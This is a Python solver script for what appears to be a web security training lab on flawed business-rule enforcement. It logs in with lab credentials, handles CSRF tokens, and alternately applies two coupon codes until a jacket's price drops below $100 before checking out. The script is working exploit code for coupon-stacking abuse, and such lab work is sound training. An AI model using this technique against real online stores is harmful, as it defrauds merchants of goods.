"""
    Lab: Flawed enforcement of business rules

    Exploitation Steps:
    1. Catch the CSRF-Token from login page
    2. Login as wiener:peter
    3. Place the leather jacket productId=1
    4. Apply the cupons NEWCUST5 and SIGNUP30 alternativally until the price be less than $100
    5. Checkout the order

    Author: N00BCYB0T
"""

import argparse
import re
from colorama import Fore
from decimal import Decimal, ROUND_HALF_UP
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}Logging as 'wiener:peter'...{Fore.RESET}")
    data = {
        "username": "wiener",
        "password": "peter"
    }
    login(session, data)

    print(f"{Fore.YELLOW}Placing the jacket order...{Fore.RESET}")
    place_jacket(session)
    
    print(f"{Fore.YELLOW}Applying the coupons...{Fore.RESET}")
    price = check_price(session)
    count = 0
    while price > 100:
        apply_coupon(session, count)
        count+=1
        price = check_price(session)

    print(f"{Fore.YELLOW}Checking out...{Fore.RESET}")
    order_confirmation(session)

    response = fetch(session, "/cart")
    if "Congratulations, you solved the lab!" in response.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Lab not solved!{Fore.RESET}")

def fetch(session, path):
    try:
        url = path if path.startswith("http") else f"{URL}{path}"
        return session.get(url, allow_redirects=True)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to fetch {path}: {e}{Fore.RESET}")
        exit(1)
     
def get_csrf(text):
    match = re.search(r'csrf\" value=\"(.+?)\"', text)
    if not match:
        print(f"{Fore.RED}[-] CSRF token not found!{Fore.RESET}")
        exit(1)
    print(f"{Fore.GREEN}[+] Found CSRF Token: {match.group(1)}{Fore.RESET}")
    return match.group(1)

def login(session, data):
    response = fetch(session, "/login")
    csrf_token = get_csrf(response.text)
    data['csrf'] = csrf_token
    try:
        session.post(f"{URL}/login", data=data, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to login: {e}{Fore.RESET}")
        exit(1)

def place_jacket(session):
    try:
        url = f"{URL}/cart"
        data = {
            "productId": 1,
            "redir": "PRODUCT",
            "quantity": 1
        }
        session.post(url, data, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to place the jacket: {e}{Fore.RESET}")
        exit(1)

def apply_coupon(session, count):
    response =fetch(session, "/cart")
    csrf_token = get_csrf(response.text)
    if count % 2 == 0:
        try:
            session.post(
                f"{URL}/cart/coupon", 
                data={
                    "csrf": csrf_token,
                    "coupon":"NEWCUST5"},
                allow_redirects=False
            )
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to place order through exception: {e}{Fore.RESET}")
            exit(1)
    else:
        try:
            session.post(
                f"{URL}/cart/coupon", 
                data={
                    "csrf": csrf_token,
                    "coupon":"SIGNUP30"
                },
                allow_redirects=False
            )
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to place order through exception: {e}{Fore.RESET}")
            exit(1)

def check_price(session):
    response = fetch(session, "/cart")
    match = re.search(r"Total:\s*</th>\s*<th>\s*([-\$0-9.,]+)", response.text)
    if not match:
        print(f"{Fore.RED}[-] Could not find total price in cart!{Fore.RESET}")
        exit(1)
    total_str = match.group(1).replace("$", "").replace(",", ".")
    total = Decimal(total_str).to_integral_value(rounding=ROUND_HALF_UP)
    print(f"{Fore.CYAN}[*] Cart total: {total}{Fore.RESET}")
    return int(total)

def order_confirmation(session):
    response =fetch(session, "/cart")
    csrf_token = get_csrf(response.text)
    url_checkout = f"{URL}/cart/checkout"
    data = {
        "csrf": csrf_token
    }
    session.post(url_checkout, data, allow_redirects=False)
    url_confirmation = f"{URL}/cart/order-confirmation"
    params = {
        "order-confirmed": True
    }
    session.get(url_confirmation, params=params)

if __name__ == "__main__":
    main()
